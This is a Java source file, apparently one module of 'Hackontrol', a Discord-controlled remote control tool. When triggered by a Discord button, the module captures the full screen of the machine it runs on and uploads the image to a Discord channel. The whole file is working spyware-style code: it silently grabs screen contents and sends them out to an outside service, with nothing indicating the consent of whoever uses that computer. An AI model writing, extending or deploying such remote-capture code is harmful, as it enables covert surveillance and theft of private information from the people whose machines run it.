package com.khopan.hackontrol.module;

import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.image.BufferedImage;
import java.io.ByteArrayOutputStream;
import java.util.Calendar;

import javax.imageio.ImageIO;

import com.khopan.hackontrol.manager.interaction.ButtonContext;
import com.khopan.hackontrol.manager.interaction.ButtonManager;
import com.khopan.hackontrol.manager.interaction.ButtonManager.ButtonType;
import com.khopan.hackontrol.manager.interaction.InteractionManager;
import com.khopan.hackontrol.registry.Registry;
import com.khopan.hackontrol.utils.HackontrolError;
import com.khopan.hackontrol.utils.HackontrolMessage;
import com.khopan.hackontrol.utils.TimeSafeReplyHandler;
import com.khopan.hackontrol.utils.interaction.HackontrolButton;
import com.khopan.hackontrol.utils.sendable.sender.ConsumerMessageCreateDataSendable;

import net.dv8tion.jda.api.interactions.components.ActionRow;
import net.dv8tion.jda.api.interactions.components.buttons.Button;
import net.dv8tion.jda.api.utils.FileUpload;
import net.dv8tion.jda.api.utils.messages.MessageCreateBuilder;

public class ScreenshotModule extends Module {
	private static final String MODULE_NAME = "screenshot";

	private static final Button BUTTON_SCREENSHOT = ButtonManager.staticButton(ButtonType.SUCCESS, "Screenshot", "screenshot");
	private static final Button BUTTON_REFRESH    = ButtonManager.staticButton(ButtonType.SUCCESS, "Refresh",    "screenshotRefresh");

	private Robot robot;

	@Override
	public String getName() {
		return ScreenshotModule.MODULE_NAME;
	}

	@Override
	public void preInitialize(Registry registry) {
		registry.register(InteractionManager.BUTTON_REGISTRY, ScreenshotModule.BUTTON_SCREENSHOT, this :: buttonScreenshot);
		registry.register(InteractionManager.BUTTON_REGISTRY, ScreenshotModule.BUTTON_REFRESH,    this :: buttonRefresh);
	}

	@Override
	public void initialize() {
		this.channel.sendMessageComponents(ActionRow.of(ScreenshotModule.BUTTON_SCREENSHOT)).queue();
	}

	private void buttonScreenshot(ButtonContext context) {
		TimeSafeReplyHandler.start(context, consumer -> {
			try {
				if(this.robot == null) {
					this.robot = new Robot();
				}

				MessageCreateBuilder builder = new MessageCreateBuilder();
				builder.setFiles(ScreenshotModule.uploadImage(this.robot.createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize())), "screenshot"));
				builder.addActionRow(ScreenshotModule.BUTTON_SCREENSHOT, ScreenshotModule.BUTTON_REFRESH, HackontrolButton.delete());
				consumer.accept(builder.build());
			} catch(Throwable Errors) {
				HackontrolError.throwable(ConsumerMessageCreateDataSendable.of(consumer), Errors);
			}
		});
	}

	private void buttonRefresh(ButtonContext context) {
		this.buttonScreenshot(context);
		HackontrolMessage.delete(context);
	}

	static FileUpload uploadImage(BufferedImage image, String baseName) throws Throwable {
		ByteArrayOutputStream stream = new ByteArrayOutputStream();
		ImageIO.write(image, "png", stream);
		String fileName;

		try {
			Calendar calendar = Calendar.getInstance();
			fileName = String.format("%s-%04d_%02d_%02d-%02d_%02d_%02d_%03d.png", baseName, calendar.get(Calendar.YEAR), calendar.get(Calendar.MONTH) + 1, calendar.get(Calendar.DAY_OF_MONTH), calendar.get(Calendar.HOUR_OF_DAY), calendar.get(Calendar.MINUTE), calendar.get(Calendar.SECOND), calendar.get(Calendar.MILLISECOND));
		} catch(Throwable Errors) {
			fileName = baseName + ".png";
		}

		return FileUpload.fromData(stream.toByteArray(), fileName);
	}
}